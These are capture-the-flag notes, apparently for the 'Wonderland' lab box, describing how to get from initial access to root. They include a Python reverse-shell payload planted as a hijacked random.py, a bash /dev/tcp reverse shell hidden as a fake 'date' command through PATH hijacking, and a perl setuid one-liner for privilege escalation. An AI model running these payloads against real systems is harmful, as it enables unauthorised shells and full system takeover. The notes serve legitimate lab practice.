# Wonderland

Ports:

- 22 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- 80 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

/r/a/b/b/i/t/ contains ssh credentials

**Users**

- alice -> ssh creds in source
- rabbit -> run walrus as rabbit with malicious random.py
	alice can run walrus as rabbit:
	`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

	create a malicious random.py file
	```
	import os
	import socket
	import subprocess

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
	s.connect(("10.10.0.1",4444));
	os.dup2(s.fileno(),0);
	os.dup2(s.fileno(),1);
	os.dup2(s.fileno(),2);
	os.putenv("HISTFILE", "/dev/null");
	p=subprocess.call(["/bin/bash","-i"]);
	```

- hatter -> use teaParty call to date to run malicious date script by editing PATH
	create reverse shell bash script called date in /tmp:
	```
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.1.10/4444 0>&1
	```

	add /tmp to PATH variable:
	`export PATH=/tmp:$PATH`

	start a netcat listener and run ./teaParty

- root -> perl cap_setuid+ep, privesc
	ssh into the box as hatter with his password in his home directory

	run perl to elevate privileges to root:
	`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`

perl has cap_setuid+ep (root), hatter can execute